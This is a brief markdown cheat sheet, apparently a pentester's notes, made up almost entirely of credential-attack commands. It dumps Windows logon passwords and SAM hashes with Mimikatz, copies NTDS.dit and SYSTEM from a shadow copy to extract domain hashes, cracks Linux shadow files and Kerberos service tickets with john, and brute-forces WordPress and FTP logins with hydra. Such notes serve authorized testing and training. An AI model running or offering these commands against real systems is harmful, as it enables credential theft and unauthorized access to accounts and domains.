# passowrd

## Mimikatz
```bash
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
```

## generate wordlist
```bash
crunch 11 11 IAmNumber%%
```


## recover NTDS file(Domain controller's hashes)
```bash
#Copy NTDS.dit and SYSTEM for recover the hashes
vssadmin.exe create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit <dest>
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM <dest>

#recover hashes
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -o hashes
```


## Password cracking
unix passowrd
```bash
#crack linux shadow file
unshadow /etc/passwd /etc/shadow > hash && john --wordlist=/usr/share/wordlists/rockyou.txt hash

#crack SPN's password
#need to get TGS first(See domain enumeration in win_EoP.md)
kirbi2john.py mssql.kirbi  > mssql_tgs.john
john  --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt  mssql_tgs.john 

```


## Password guessing
wordpress
```bash
#wp-login
hydra -L lists/usrname.txt -P lists/pass.txt <target> -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'

#ftp
hydra -t 1 -l kaitlyn -P /usr/share/wordlists/wfuzz/others/common_pass.txt  -vV <target> ftp

```



## reference
https://linuxconfig.org/test-wordpress-logins-with-hydra-on-kali-linux
